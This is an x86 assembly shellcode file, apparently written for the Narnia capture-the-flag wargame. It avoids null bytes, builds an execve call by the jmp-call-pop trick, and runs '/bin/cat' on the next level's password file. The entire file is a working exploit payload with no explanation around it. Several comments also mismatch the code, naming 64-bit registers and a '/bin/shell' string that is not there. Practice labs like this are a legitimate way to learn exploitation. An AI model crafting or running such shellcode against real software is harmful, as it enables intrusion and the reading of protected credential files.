BITS 32

global _start
jmp short t

_start:

	; To call execve with shell, we need the program's name, an array of the name and then
	;	a NULL and a pointer to a NULL.
	; Since we can't retminate the string and add NULLs in the code (to prevent)
	;	nullbytes), we'll generate them dynamically
	xor eax, eax
	pop ebx ; rbx = &msg
	; Put values in registers for syscall. String's address is already in rdi
	lea ecx, [ebx + 34] ; put the array address in ecx
	lea edx, [ebx + 42] ; Put the NULL address in rdx

	mov [ebx + 8], al ; Null terminate the string
	mov [ebx + 33], al ; Null terminate the string
	mov [ecx], ebx ; Put the address of the string instead of the AAAA
	add ebx, 9
	mov [ecx+4], ebx ; Put the address of the string instead of the AAAA
	sub ebx, 9
	mov [edx], eax ; Put a NULL instead of the BBBB, to mark the end of arr

	mov al, 11 ; the execve syscall number
	int 0x80

	XCHG AX, AX
	add ax, 0x9828

	; exit properly
	; mov al, 60
	; xor rdi, rdi
	; syscall

t:
	call _start
	; X is a place holder for a NULL string terminator, AAAA is for the address
	;	of the string "/bin/shell" and BBBB is for a NULL array terminator
	msg db "/bin/cat+/etc/narnia_pass/narnia3"
